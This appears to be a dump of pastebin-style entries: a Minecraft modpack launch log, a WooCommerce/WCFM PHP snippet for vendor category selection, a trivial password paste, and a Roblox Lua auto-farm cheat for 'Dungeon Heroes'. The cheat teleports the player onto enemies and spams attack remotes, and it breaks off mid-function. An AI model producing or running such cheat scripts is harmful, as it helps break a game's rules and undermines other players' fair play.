	- puzzleslib 8.1.17
	- railways 1.6.6+forge-mc1.20.1
	- rechiseled 1.1.5c
	- rechiseledcreate 1.0.2
	- recipeessentials 1.20.1-3.2
	- rep 1.0.0
	- replaymod 1.20.1-2.6.13
	- resourcefullib 2.1.23
	- rightclickharvest 3.2.3+1.20.1-forge
	- ritchiesprojectilelib 2.0.0-dev+mc.1.20.1-forge-build.182
	- rubidium 0.7.1
	- s_a_b 1.4.2
	- searchables 1.0.2
	- simpleclouds 0.6.3+1.20.1-forge
	- skinlayers3d 1.7.0
	- sliceanddice 3.3.0
	- smoothchunk 1.20.1-3.6
	- sodiumdynamiclights 1.0.9
	- sodiumextras 1.0.6
	- sodiumoptionsapi 1.0.10
	- sound_physics_remastered 1.20.1-1.1.2
	- spectrelib 0.13.15+1.20.1
	- splashy 14.0.4
	- starlight 1.1.2+forge.1cda73c
	- storagedrawers 12.0.3
	- structureessentials 1.20.1-3.3
	- structurize 1.20.1-1.0.759-snapshot
	- stylecolonies 1.12
	- supermartijn642configlib 1.1.8
	- supermartijn642corelib 1.1.17
	- tectonic 2.3.4
	- terrablender 3.0.1.4
	- terraform 7.0.1
	- terralith 2.4.11
	- tfmg 0.9.3-1.20.1
	- torchmaster 20.1.8
	- towntalk 1.0.1
	- trackwork 1.1.1b
	- trashcans 1.0.18b
	- travelersbackpack 9.1.16
	- valkyrienskies 2.3.0-beta.5
	- vs_clockwork 1.20.1-0.1.16-forge-b3b22e39fe
	- vs_eureka 1.5.1-beta.3
	- vs_tournament 1.1.0_beta-5.3+af35b3821f
	- waystones 14.1.5
	- worldedit 7.2.15+6463-5ca4dff
	- xaerominimap 25.2.0
	- xaeroplus 2.26.5
	- xaeroworldmap 1.39.4
[01:23:45] [main/WARN]: Reference map 'create_eureka-common-refmap.json' for create_eureka-common.mixins.json could not be read. If this is a development environment you can ignore this message
[01:23:45] [main/WARN]: Reference map 'eureka-1201-forge-refmap.json' for vs_eureka.mixins.json could not be read. If this is a development environment you can ignore this message
[01:23:45] [main/WARN]: Reference map 'mixins.nonmmlauncher.replaymod.refmap.json' for mixins.nonmmlauncher.replaymod.json could not be read. If this is a development environment you can ignore this message
[01:23:45] [main/WARN]: Reference map 'CreateLiquidFuel.refmap.json' for createliquidfuel.mixins.json could not be read. If this is a development environment you can ignore this message
[01:23:45] [main/WARN]: Reference map 'capes-forge-refmap.json' for capes-forge.mixins.json could not be read. If this is a development environment you can ignore this message
[01:23:45] [main/WARN]: Reference map 'tfmg.refmap.json' for tfmg.mixins.json could not be read. If this is a development environment you can ignore this message
[01:23:45] [main/WARN]: Reference map 'molten_metals-common-refmap.json' for molten_metals-common.mixins.json could not be read. If this is a development environment you can ignore this message
[01:23:45] [main/WARN]: Reference map 'createappliedkinetics.refmap.json' for createappliedkinetics.mixins.json could not be read. If this is a development environment you can ignore this message
[01:23:45] [main/WARN]: Reference map 'immersive_paintings-common-refmap.json' for immersive_paintings.mixin.json could not be read. If this is a development environment you can ignore this message
[01:23:45] [main/WARN]: Reference map 'mixins.trackwork.refmap.json' for trackwork.mixins.json could not be read. If this is a development environment you can ignore this message
[01:23:45] [main/WARN]: Reference map '' for adapter.init.mixins.json could not be read. If this is a development environment you can ignore this message
[01:23:46] [main/WARN]: Error loading class: mekanism/client/render/entity/RenderFlame (java.lang.ClassNotFoundException: mekanism.client.render.entity.RenderFlame)
[01:23:46] [main/WARN]: Error loading class: mekanism/client/render/armor/MekaSuitArmor (java.lang.ClassNotFoundException: mekanism.client.render.armor.MekaSuitArmor)
[01:23:47] [main/WARN]: Error loading class: dev/latvian/mods/kubejs/recipe/RecipesEventJS (java.lang.ClassNotFoundException: dev.latvian.mods.kubejs.recipe.RecipesEventJS)
[01:23:47] [main/WARN]: @Mixin target dev.latvian.mods.kubejs.recipe.RecipesEventJS was not found sliceanddice.mixins.json:RecipeEventJSMixin from mod sliceanddice
[01:23:47] [main/INFO]: Loaded config for: betterfpsdist.json
[01:23:47] [main/WARN]: Error loading class: com/jamieswhiteshirt/reachentityattributes/ReachEntityAttributes (java.lang.ClassNotFoundException: com.jamieswhiteshirt.reachentityattributes.ReachEntityAttributes)
[01:23:47] [main/WARN]: Error loading class: blusunrize/immersiveengineering/common/gui/BlockEntityInventory (java.lang.ClassNotFoundException: blusunrize.immersiveengineering.common.gui.BlockEntityInventory)
[01:23:47] [main/WARN]: Error loading class: net/dries007/tfc/world/TFCChunkGenerator (java.lang.ClassNotFoundException: net.dries007.tfc.world.TFCChunkGenerator)
[01:23:47] [main/WARN]: Error loading class: cofh/core/block/entity/TileCoFH (java.lang.ClassNotFoundException: cofh.core.block.entity.TileCoFH)
[01:23:47] [main/WARN]: Error loading class: li/cil/tis3d/common/entity/InfraredPacketEntity (java.lang.ClassNotFoundException: li.cil.tis3d.common.entity.InfraredPacketEntity)
[01:23:47] [main/WARN]: Error loading class: me/desht/modularrouters/container/RouterMenu (java.lang.ClassNotFoundException: me.desht.modularrouters.container.RouterMenu)
[01:23:47] [main/WARN]: Error loading class: li/cil/tis3d/client/renderer/block/entity/CasingBlockEntityRenderer (java.lang.ClassNotFoundException: li.cil.tis3d.client.renderer.block.entity.CasingBlockEntityRenderer)
[01:23:47] [main/WARN]: Error loading class: li/cil/tis3d/client/renderer/RenderContextImpl (java.lang.ClassNotFoundException: li.cil.tis3d.client.renderer.RenderContextImpl)
[01:23:47] [main/INFO]: Loaded config for: recipeessentials.json
[01:23:47] [main/INFO]: Loaded config for: structureessentials.json
[01:23:47] [main/WARN]: Error loading class: net/caffeinemc/mods/sodium/client/model/light/data/ArrayLightDataCache (java.lang.ClassNotFoundException: net.caffeinemc.mods.sodium.client.model.light.data.ArrayLightDataCache)
[01:23:47] [main/WARN]: Error loading class: net/caffeinemc/mods/sodium/client/model/light/flat/FlatLightPipeline (java.lang.ClassNotFoundException: net.caffeinemc.mods.sodium.client.model.light.flat.FlatLightPipeline)
[01:23:47] [main/WARN]: Error loading class: net/caffeinemc/mods/sodium/client/model/light/data/LightDataAccess (java.lang.ClassNotFoundException: net.caffeinemc.mods.sodium.client.model.light.data.LightDataAccess)
[01:23:47] [main/WARN]: Error loading class: me/jellysquid/mods/lithium/common/ai/pathing/PathNodeDefaults (java.lang.ClassNotFoundException: me.jellysquid.mods.lithium.common.ai.pathing.PathNodeDefaults)
[01:23:48] [main/WARN]: Error loading class: net/coderbot/iris/gl/program/ProgramSamplers (java.lang.ClassNotFoundException: net.coderbot.iris.gl.program.ProgramSamplers)
[01:23:48] [main/WARN]: @Mixin target net.coderbot.iris.gl.program.ProgramSamplers was not found irisflw.mixins.flw.json:MixinProgramSamplers from mod irisflw
[01:23:48] [main/WARN]: Error loading class: net/coderbot/iris/shaderpack/ProgramSet (java.lang.ClassNotFoundException: net.coderbot.iris.shaderpack.ProgramSet)
[01:23:48] [main/WARN]: @Mixin target net.coderbot.iris.shaderpack.ProgramSet was not found irisflw.mixins.iris.json:ProgramSetMixin from mod irisflw
[01:23:48] [main/WARN]: Error loading class: net/coderbot/iris/pipeline/newshader/NewWorldRenderingPipeline (java.lang.ClassNotFoundException: net.coderbot.iris.pipeline.newshader.NewWorldRenderingPipeline)
[01:23:48] [main/WARN]: @Mixin target net.coderbot.iris.pipeline.newshader.NewWorldRenderingPipeline was not found irisflw.mixins.iris.json:MixinNewWorldRenderingPipeline from mod irisflw
[01:23:48] [main/WARN]: Error loading class: net/coderbot/iris/shaderpack/include/ShaderPackSourceNames (java.lang.ClassNotFoundException: net.coderbot.iris.shaderpack.include.ShaderPackSourceNames)
[01:23:48] [main/WARN]: @Mixin target net.coderbot.iris.shaderpack.include.ShaderPackSourceNames was not found irisflw.mixins.iris.json:MixinShaderPackSourceNames from mod irisflw
[01:23:48] [main/WARN]: Error loading class: net/coderbot/iris/shaderpack/ProgramSource (java.lang.ClassNotFoundException: net.coderbot.iris.shaderpack.ProgramSource)
[01:23:48] [main/WARN]: @Mixin target net.coderbot.iris.shaderpack.ProgramSource was not found irisflw.mixins.iris.json:MixinProgramSource from mod irisflw
[01:23:48] [main/WARN]: Error loading class: net/coderbot/iris/shaderpack/ProgramDirectives (java.lang.ClassNotFoundException: net.coderbot.iris.shaderpack.ProgramDirectives)
[01:23:48] [main/WARN]: @Mixin target net.coderbot.iris.shaderpack.ProgramDirectives was not found irisflw.mixins.iris.json:MixinProgramDirectives from mod irisflw
[01:23:48] [main/WARN]: Error loading class: net/coderbot/iris/pipeline/newshader/ExtendedShader (java.lang.ClassNotFoundException: net.coderbot.iris.pipeline.newshader.ExtendedShader)
[01:23:48] [main/WARN]: @Mixin target net.coderbot.iris.pipeline.newshader.ExtendedShader was not found irisflw.mixins.iris.json:ExtendedShaderAccessor from mod irisflw
[01:23:48] [main/WARN]: Error loading class: net/coderbot/iris/pipeline/ShadowRenderer (java.lang.ClassNotFoundException: net.coderbot.iris.pipeline.ShadowRenderer)
[01:23:48] [main/WARN]: @Mixin target net.coderbot.iris.pipeline.ShadowRenderer was not found irisflw.mixins.iris.json:MixinShadowRenderer from mod irisflw
[01:23:48] [main/WARN]: Error loading class: earth/terrarium/botarium/forge/BotariumForge (java.lang.ClassNotFoundException: earth.terrarium.botarium.forge.BotariumForge)
[01:23:48] [main/WARN]: @Mixin target earth.terrarium.botarium.forge.BotariumForge was not found create_central_kitchen.mixins.json:common.botarium.BotariumForgeMixin from mod create_central_kitchen
[01:23:48] [main/WARN]: Error loading class: dan200/computercraft/shared/integration/MoreRedIntegration (java.lang.ClassNotFoundException: dan200.computercraft.shared.integration.MoreRedIntegration)
[01:23:48] [main/WARN]: @Mixin target dan200.computercraft.shared.integration.MoreRedIntegration was not found create_central_kitchen.mixins.json:common.computercraft.MoreRedIntegrationMixin from mod create_central_kitchen
[01:23:48] [main/WARN]: Error loading class: com/sammy/minersdelight/content/block/copper_pot/CopperPotBlockEntity (java.lang.ClassNotFoundException: com.sammy.minersdelight.content.block.copper_pot.CopperPotBlockEntity)
[01:23:48] [main/WARN]: @Mixin target com.sammy.minersdelight.content.block.copper_pot.CopperPotBlockEntity was not found create_central_kitchen.mixins.json:common.minersdelight.CopperPotBlockEntityMixin from mod create_central_kitchen
[01:23:48] [main/WARN]: Error loading class: com/sammy/minersdelight/content/block/sticky_basket/StickyBasketBlockEntity (java.lang.ClassNotFoundException: com.sammy.minersdelight.content.block.sticky_basket.StickyBasketBlockEntity)
[01:23:48] [main/WARN]: @Mixin target com.sammy.minersdelight.content.block.sticky_basket.StickyBasketBlockEntity was not found create_central_kitchen.mixins.json:common.minersdelight.StickyBasketBlockEntityAccessor from mod create_central_kitchen
[01:23:48] [main/WARN]: Error loading class: com/sammy/minersdelight/content/block/sticky_basket/StickyBasketBlockEntity (java.lang.ClassNotFoundException: com.sammy.minersdelight.content.block.sticky_basket.StickyBasketBlockEntity)
[01:23:48] [main/WARN]: @Mixin target com.sammy.minersdelight.content.block.sticky_basket.StickyBasketBlockEntity was not found create_central_kitchen.mixins.json:common.minersdelight.StickyBasketBlockEntityMixin from mod create_central_kitchen
[01:23:48] [main/WARN]: Error loading class: net/orcinus/overweightfarming/blocks/CropFullBlock (java.lang.ClassNotFoundException: net.orcinus.overweightfarming.blocks.CropFullBlock)
[01:23:48] [main/WARN]: @Mixin target net.orcinus.overweightfarming.blocks.CropFullBlock was not found create_central_kitchen.mixins.json:common.overweightfarming.CropFullBlockMixin from mod create_central_kitchen
[01:23:48] [main/WARN]: Force-disabling mixin 'features.render.world.sky.WorldRendererMixin' as rule 'mixin.features.render.world.sky' (added by mods [oculus]) disables it and children
[01:23:48] [main/WARN]: Force-disabling mixin 'features.render.world.sky.ClientWorldMixin' as rule 'mixin.features.render.world.sky' (added by mods [oculus]) disables it and children
[01:23:48] [main/WARN]: Force-disabling mixin 'features.render.world.sky.BackgroundRendererMixin' as rule 'mixin.features.render.world.sky' (added by mods [oculus]) disables it and children
[01:23:48] [main/WARN]: Force-disabling mixin 'features.render.gui.font.GlyphRendererMixin' as rule 'mixin.features.render.gui.font' (added by mods [oculus]) disables it and children
[01:23:48] [main/WARN]: Force-disabling mixin 'features.render.gui.font.FontSetMixin' as rule 'mixin.features.render.gui.font' (added by mods [oculus]) disables it and children
[01:23:48] [main/WARN]: Force-disabling mixin 'features.render.entity.shadows.EntityRenderDispatcherMixin' as rule 'mixin.features.render.entity' (added by mods [oculus]) disables it and children
[01:23:48] [main/WARN]: Force-disabling mixin 'features.render.entity.remove_streams.ModelPartMixin' as rule 'mixin.features.render.entity' (added by mods [oculus]) disables it and children
[01:23:48] [main/WARN]: Force-disabling mixin 'features.render.entity.remove_streams.HierarchicalModelMixin' as rule 'mixin.features.render.entity' (added by mods [oculus]) disables it and children
[01:23:48] [main/WARN]: Force-disabling mixin 'features.render.entity.fast_render.ModelPartMixin' as rule 'mixin.features.render.entity' (added by mods [oculus]) disables it and children
[01:23:48] [main/WARN]: Force-disabling mixin 'features.render.entity.fast_render.CuboidMixin' as rule 'mixin.features.render.entity' (added by mods [oculus]) disables it and children
[01:23:48] [main/WARN]: Force-disabling mixin 'features.render.entity.cull.EntityRendererMixin' as rule 'mixin.features.render.entity' (added by mods [oculus]) disables it and children
[01:23:48] [main/WARN]: Error loading class: net/caffeinemc/mods/sodium/client/model/light/data/ArrayLightDataCache (java.lang.ClassNotFoundException: net.caffeinemc.mods.sodium.client.model.light.data.ArrayLightDataCache)
[01:23:48] [main/WARN]: Error loading class: net/caffeinemc/mods/sodium/client/model/light/data/ArrayLightDataCache (java.lang.ClassNotFoundException: net.caffeinemc.mods.sodium.client.model.light.data.ArrayLightDataCache)
[01:23:48] [main/WARN]: Error loading class: net/caffeinemc/mods/sodium/client/model/light/flat/FlatLightPipeline (java.lang.ClassNotFoundException: net.caffeinemc.mods.sodium.client.model.light.flat.FlatLightPipeline)
[01:23:48] [main/WARN]: Error loading class: net/caffeinemc/mods/sodium/client/model/light/flat/FlatLightPipeline (java.lang.ClassNotFoundException: net.caffeinemc.mods.sodium.client.model.light.flat.FlatLightPipeline)
[01:23:48] [main/WARN]: Error loading class: net/caffeinemc/mods/sodium/client/model/light/data/LightDataAccess (java.lang.ClassNotFoundException: net.caffeinemc.mods.sodium.client.model.light.data.LightDataAccess)
[01:23:48] [main/WARN]: Error loading class: net/caffeinemc/mods/sodium/client/model/light/data/LightDataAccess (java.lang.ClassNotFoundException: net.caffeinemc.mods.sodium.client.model.light.data.LightDataAccess)
[01:23:48] [main/WARN]: Error loading class: net/optifine/render/ChunkVisibility (java.lang.ClassNotFoundException: net.optifine.render.ChunkVisibility)
[01:23:48] [main/WARN]: Error loading class: shadersmod/client/ShadersRender (java.lang.ClassNotFoundException: shadersmod.client.ShadersRender)
[01:23:48] [main/WARN]: Error loading class: net/optifine/shaders/ShadersRender (java.lang.ClassNotFoundException: net.optifine.shaders.ShadersRender)
[01:23:48] [main/WARN]: Error loading class: net/coderbot/iris/uniforms/CommonUniforms (java.lang.ClassNotFoundException: net.coderbot.iris.uniforms.CommonUniforms)
[01:23:48] [main/WARN]: Error loading class: net/coderbot/iris/Iris (java.lang.ClassNotFoundException: net.coderbot.iris.Iris)
[01:23:48] [main/WARN]: Error loading class: net/coderbot/iris/pipeline/HandRenderer (java.lang.ClassNotFoundException: net.coderbot.iris.pipeline.HandRenderer)
[01:23:48] [main/INFO]: Initializing MixinExtras via com.llamalad7.mixinextras.service.MixinExtrasServiceImpl(version=0.4.1).
[01:23:50] [pool-4-thread-1/INFO]: ModernFix reached bootstrap stage (16.96 s after launch)
[01:23:50] [pool-4-thread-1/WARN]: @Final field delegatesByName:Ljava/util/Map; in modernfix-forge.mixins.json:perf.forge_registry_alloc.ForgeRegistryMixin from mod modernfix should be final
[01:23:50] [pool-4-thread-1/WARN]: @Final field delegatesByValue:Ljava/util/Map; in modernfix-forge.mixins.json:perf.forge_registry_alloc.ForgeRegistryMixin from mod modernfix should be final
[01:23:50] [pool-4-thread-1/INFO]: Injecting BlockStateBase cache population hook into getOpacityIfCached from ca.spottedleaf.starlight.mixin.common.blockstate.BlockStateBaseMixin
[01:23:50] [pool-4-thread-1/INFO]: Injecting BlockStateBase cache population hook into isConditionallyFullOpaque from ca.spottedleaf.starlight.mixin.common.blockstate.BlockStateBaseMixin
[01:23:51] [pool-4-thread-1/INFO]: Vanilla bootstrap took 1375 milliseconds
"
TE8NTgLA,product-categories-field-on-vendor-registration-form,palsushobhan,PHP,Saturday 19th of July 2025 11:36:09 PM CDT,"/* Add product categories in the registration form and allow vendors only those categories */
add_action( 'end_wcfm_membership_registration_form', function() {
	$selected_categories = array();
	
	$product_categories   = get_terms( 'product_cat', 'orderby=name&hide_empty=0&parent=0' );
	$p_category_options   = array();
	foreach ( $product_categories as $cat ) {
		$p_category_options[$cat->term_id] = array( 'name' => $cat->name, 'parent' => 0 );
	}
	
	if( !empty( $p_category_options ) ) showRegistrationCategoryHierarchySelector( $p_category_options, $selected_categories );
	?>
	<script>
	jQuery(document).ready(function($) {
		$('.wcfm_category_hierarchy').each(function() {
			$(this).change(function() {
				$level = parseInt($(this).data('level'));
				$value = $(this).val();
				if( $('.p_category_'+($level+1)).length > 0 ) {
					$('.p_category_'+($level+1)).addClass('wcfm_custom_hide');
					$('.p_category_label_'+($level+1)).addClass('wcfm_custom_hide');
					if( $value ) {
						$.each($value, function( $i, $svalue ) {
							if( $('.p_category_'+($level+1)).find('.cat_parent_'+$svalue).length > 0 ) {
								$('.p_category_'+($level+1)).removeClass('wcfm_custom_hide');
								$('.p_category_label_'+($level+1)).removeClass('wcfm_custom_hide');
							}
						});
					}
					$level_1 = $('.p_category_'+($level+1)).val();
					$('.p_category_'+($level+1)).val('');
					$('.p_category_'+($level+1)).find('option').addClass('wcfm_custom_hide');
					if( $value ) {
						$.each($value, function( $i, $svalue ) {
							$('.p_category_'+($level+1)).find('.cat_parent_'+$svalue).removeClass('wcfm_custom_hide');
						});
					}
					if( $level_1 ) {
						if( !$('.p_category_'+($level+1)).find('option[value=""'+$level_1+'""]').hasClass('wcfm_custom_hide') ) {
							$('.p_category_'+($level+1)).val($level_1);
						}
					}
					$('.p_category_'+($level+1)).change();
				}
			}).change();
			
		});
	});
	</script>
	<?php
});

function showRegistrationCategoryHierarchySelector( $p_category_options, $selected_categories, $level = 0 ) {
	global $WCFM, $WCFMch;
	
	$p_category_child_options = array();
	$ptax_custom_arrtibutes = apply_filters( 'wcfm_taxonomy_custom_attributes', array(), 'product_cat' );
	?>
	<p class=""wcfm_title p_category_label_<?php echo $level; ?>"">
		<strong>
			<?php 
			echo apply_filters( 'wcfm_taxonomy_custom_label', '', 'product_cat' );
			if( $level ) _e( 'Sub-', 'wcfm-category-hierarchy' ); 
			_e( 'Categories', 'wc-frontend-manager' ); 
			?>
		</strong>
	</p>
	<label class=""screen-reader-text"" for=""product_cats"">
		<?php 
		if( $level ) echo __( 'Sub-', 'wcfm-category-hierarchy' );
		echo apply_filters( 'wcfm_taxonomy_custom_label', __( 'Categories', 'wc-frontend-manager' ), 'product_cat' ); 
		?>
	</label>
	<select id=""p_category_<?php echo $level; ?>"" style=""height: auto;"" multiple name=""reg_category[<?php echo $level; ?>][]"" class=""wcfm-select wcfm_category_hierarchy p_category_<?php echo $level; ?>"" data-level=""<?php echo $level; ?>"" data-catlimit=""1"" <?php echo implode( ' ', $ptax_custom_arrtibutes ); ?>>
		<option value=""""><?php _e( '-- Select Category --', 'wcfm-category-hierarchy' ); ?></option>
		<?php
		foreach( $p_category_options as $term_id => $term_details ) {
			$cat_group_class = 'cat_parent_' . $term_details['parent'];
			echo '<option class=""' . $cat_group_class . '"" value=""' . esc_attr( $term_id ) . '""' . selected( in_array( $term_id, $selected_categories ), true, false ) . '>' . __( esc_html( $term_details['name'] ), 'wcfm-category-hierarchy' ) . '</option>';
			
			$product_child_taxonomies   = get_terms( 'product_cat', 'orderby=name&hide_empty=0&parent=' . absint( $term_id ) );
			if ( $product_child_taxonomies ) {
				foreach ( $product_child_taxonomies as $cat ) {
					$p_category_child_options[$cat->term_id] = array( 'name' => $cat->name, 'parent' => $term_id );
				}
			}
		}
		?>
	</select>
	<?php
	$level++;
	if( !empty( $p_category_child_options ) ) showRegistrationCategoryHierarchySelector( $p_category_child_options, $selected_categories, $level );
}

add_action( 'wcfm_membership_registration', function( $member_id, $wcfm_membership_registration_form_data ) {
	if( isset( $wcfm_membership_registration_form_data['reg_category'] ) ) {
		update_user_meta( $member_id, 'wcfm_vendor_reg_category', $wcfm_membership_registration_form_data['reg_category'] );
	}
}, 50, 2 );

add_filter('wcfm_allowed_taxonomies', function($is_allowed, $taxonomy, $term_id) {
    global $wp;
    $vendor_id = 0;
    if($taxonomy === 'product_cat') {
        if(wcfm_is_vendor()) {
            $vendor_id = apply_filters( 'wcfm_current_vendor_id', get_current_user_id() );
        } else if(isset( $wp->query_vars['wcfm-products-manage'] ) && !empty( $wp->query_vars['wcfm-products-manage'] ) ) {
            $vendor_id = wcfm_get_vendor_id_by_post($wp->query_vars['wcfm-products-manage']);
        }
        if($vendor_id) {
            $allowed_cat = get_user_meta($vendor_id, 'wcfm_vendor_reg_category', true);
            $allowed_parent_cat = empty($allowed_cat) ? $allowed_cat : reset($allowed_cat);
            if(!empty($allowed_parent_cat)) {
                return in_array($term_id, $allowed_parent_cat);
            }
        }
    }
    return $is_allowed;
}, 10, 3);"
mSZKemd3,Untitled,ryanvxc,Lua,Saturday 19th of July 2025 10:57:48 PM CDT,Password: Ender
pNUanD2p,Untitled,Slzintv,Lua,Saturday 19th of July 2025 09:27:51 PM CDT,"-- AUTO FARM ESPECÍFICO PARA DUNGEON HEROES
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local VirtualInputManager = game:GetService(""VirtualInputManager"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local player = Players.LocalPlayer
local farmActive = false

-- CONFIGURAÇÕES ESPECÍFICAS DO DUNGEON HEROES
local farmSettings = {
    clickSpeed = 0.2,
    teleportOffset = CFrame.new(0, 0, 5),
    attackRange = 50
}

print(""=== DUNGEON HEROES FARM CARREGADO ==="")

-- MÉTODO 1: AUTO CLIQUE MELHORADO (ESPECÍFICO PARA DUNGEON HEROES)
local function autoClickDungeon()
    spawn(function()
        while farmActive do
            -- Método 1: Mouse básico
            pcall(function()
                local mouse = player:GetMouse()
                mouse.Button1Down:Fire()
                wait(0.05)
                mouse.Button1Up:Fire()
            end)
            
            -- Método 2: VirtualInputManager
            pcall(function()
                VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 1)
                wait(0.05)
                VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 1)
            end)
            
            -- Método 3: Teclas de ataque do Dungeon Heroes
            pcall(function()
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Q, false, game)
                wait(0.05)
                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Q, false, game)
            end)
            
            wait(farmSettings.clickSpeed)
        end
    end)
end

-- MÉTODO 2: FARM DE MONSTROS (VERSÃO MELHORADA PARA DUNGEON HEROES)
local function findDungeonEnemies()
    local character = player.Character
    if not character or not character:FindFirstChild(""HumanoidRootPart"") then
        print(""Sem personagem ou HumanoidRootPart"")
        return nil
    end
    
    local myPosition = character.HumanoidRootPart.Position
    local nearestEnemy = nil
    local shortestDistance = 200 -- Aumentar alcance
    
    print(""Procurando inimigos..."")
    
    -- MÉTODO MAIS AMPLO - procurar em TUDO
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA(""Model"") and obj ~= character and obj.Parent ~= Players then
            local humanoid = obj:FindFirstChild(""Humanoid"")
            local rootPart = obj:FindFirstChild(""HumanoidRootPart"") or obj:FindFirstChild(""Torso"") or obj:FindFirstChild(""Head"")
            
            if humanoid and rootPart and humanoid.Health > 0 and humanoid.MaxHealth > 0 then
                -- Verificar se NÃO é jogador
                local isPlayer = false
                for _, p in pairs(Players:GetPlayers()) do
                    if p.Character == obj then
                        isPlayer = true
                        break
                    end
                end
                
                -- Verificar nomes típicos de inimigos do Dungeon Heroes
                local enemyNames = {""goblin"", ""skeleton"", ""orc"", ""spider"", ""bandit"", ""slime"", ""wolf"", ""bat"", ""zombie""}
                local isEnemy = false
                for _, enemyName in pairs(enemyNames) do
                    if string.find(obj.Name:lower(), enemyName) then
                        isEnemy = true
                        break
                    end
                end
                
                if not isPlayer and (isEnemy or humanoid.MaxHealth < 1000) then -- NPCs geralmente têm menos HP
                    local distance = (myPosition - rootPart.Position).Magnitude
                    if distance < shortestDistance then
                        shortestDistance = distance
                        nearestEnemy = obj
                        print(""Inimigo encontrado: "" .. obj.Name .. "" | Distância: "" .. math.floor(distance))
                    end
                end
            end
        end
    end
    
    return nearestEnemy, shortestDistance
end

local function farmDungeonEnemies()
    spawn(function()
        while farmActive do
            print(""Procurando inimigos..."")
            local enemy, distance = findDungeonEnemies()
            
            if enemy then
                print(""Inimigo encontrado: "" .. enemy.Name .. "" | Distância: "" .. math.floor(distance))
                
                local character = player.Character
                if character and character:FindFirstChild(""HumanoidRootPart"") then
                    local enemyPart = enemy:FindFirstChild(""HumanoidRootPart"") or enemy:FindFirstChild(""Torso"") or enemy:FindFirstChild(""Head"")
                    
                    if enemyPart then
                        -- Teleportar mais próximo
                        local teleportCFrame = enemyPart.CFrame * CFrame.new(math.random(-3,3), 0, math.random(-3,3))
                        character.HumanoidRootPart.CFrame = teleportCFrame
                        wait(0.5) -- Esperar um pouco mais após teleport
                        
                        print(""Teleportado para: "" .. enemy.Name .. "" | Atacando..."")
                        
                        -- Atacar usando o mesmo método do auto click que funciona
                        for i = 1, 8 do -- Mais ataques
                            pcall(function()
                                local mouse = player:GetMouse()
                                mouse.Button1Down:Fire()
                                wait(0.05)
                                mouse.Button1Up:Fire()
                            end)
                            
                            pcall(function()
                                VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 1)
                                wait(0.05)
                                VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 1)
                            end)
                            
                            wait(0.15)
                        end
                        
                        wait(0.5) -- Esperar antes de procurar próximo
                    end
                end
            else
                print(""Nenhum inimigo encontrado - expandindo busca..."")
                -- Listar alguns objetos para debug
                local count = 0
                for _, obj in pairs(workspace:GetChildren()) do
                    if obj:IsA(""Model"") and count < 5 then
                        local humanoid = obj:FindFirstChild(""Humanoid"")
                        if humanoid then
                            print(""Modelo com humanoid: "" .. obj.Name .. "" | HP: "" .. humanoid.Health .. ""/"" .. humanoid.MaxHealth)
                            count = count + 1
                        end
                    end
                end
            end
            
            wait(2) -- Esperar mais entre buscas
        end
    end)
end

-- MÉTODO 3: FARM USANDO REMOTES (DUNGEON HEROES ESPECÍFICO)
local remoteFarmActive = false

local function hookDungeonRemotes()
    local remotes = {}
    
    -- Procurar por remotes de ataque
    pcall(function()
        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
            if remote:IsA(""RemoteEvent"") or remote:IsA(""RemoteFunction"") then
                local name = remote.Name:lower()
                if name:find(""attack"") or name:find(""damage"") or name:find(""hit"") or name:find(""skill"") then
                    table.insert(remotes, remote)
                end
            end
        end
    end)
    
    return remotes
end

local function farmWithRemotes()
    spawn(function()
        local attackRemotes = hookDungeonRemotes()
        
        while remoteFarmActive do
            for _, remote in pairs(attackRemotes) do
                pcall(function()
                    if remote:IsA(""RemoteEvent"") then
                        remote:FireServer()
                    end
                end)
                wait(0.1)
            end
            wait(farmSettings.clickSpeed)
        end
    end)
end

-- GUI SIMPLES PARA DUNGEON HEROES
local screenGui = Instance.new(""ScreenGui"")
screenGui.Parent = player.PlayerGui
screenGui.ResetOnSpawn = false
screenGui.Name = ""DungeonHeroesFarm""

local frame = Instance.new(""Frame"")
frame.Parent = screenGui
frame.Size = UDim2.new(0, 180, 0, 220)
frame.Position = UDim2.new(0, 10, 0.5, -110)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BackgroundTransparency = 0.3
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.new(1, 1, 1)
frame.Active = true
frame.Draggable = true

local title = Instance.new(""TextLabel"")
title.Parent = frame
title.Size = UDim2.new(1, 0, 0, 25)
title.BackgroundTransparency = 1
title.Text = ""DUNGEON HEROES FARM""
title.TextColor3 = Color3.new(1, 1, 1)
title.TextSize = 12
title.Font = Enum.Font.SourceSansBold

-- Botões específicos para Dungeon Heroes
local buttons = {
    {
        name = ""Auto Click"",
        func = function()
            farmActive = not farmActive
            if farmActive then
                print(""Auto Click ON"")
                autoClickDungeon()
            else
                print(""Auto Click OFF"")
            end
        end
    },
    {
        name = ""Farm Enemies"", 
        func = function()
            farmActive = not farmActive
            if farmActive then
                print(""Farm Enemies ON"")
                farmDungeonEnemies()
            else
                print(""Farm Enemies OFF"")
            end
        end
    },
    {
        name = ""Remote Farm"",
        func = function()
            remoteFarmActive = not remoteFarmActive
            if remoteFarmActive then
                print(""Remote Farm ON"")
                farmWithRemotes()
            else
                print(""Remote Farm OFF"")
            end
        end
    },
    {
        name = ""Stop All"",
        func = function()
            farmActive = false
            remoteFarmActive = false
            print(""All farms stopped"")
        end
    },
    {
        name = ""Debug Info"",
        func = function()
            print(""=== DEBUG DUNGEON HEROES ==="")
            print(""Player: "" .. player.Name)
            print(""Character: "" .. tostring(player.Character))
            
            if player.Character then
                print(""HumanoidRootPart: "" .. tostring(player.Character:FindFirstChild(""HumanoidRootPart"")))
                if player.Character:FindFirstChild(""HumanoidRootPart"") then
                    local pos = player.Character.HumanoidRootPart.Position
                    print(""Position: "" .. math.floor(pos.X) .. "", "" .. math.floor(pos.Y) .. "", "" .. math.floor(pos.Z))
                end
            end
            
            print(""Workspace children count: "" .. #workspace:GetChildren())
            
            -- Procurar NPCs mais detalhadamente
            local models = {}
            local npcs = {}
            
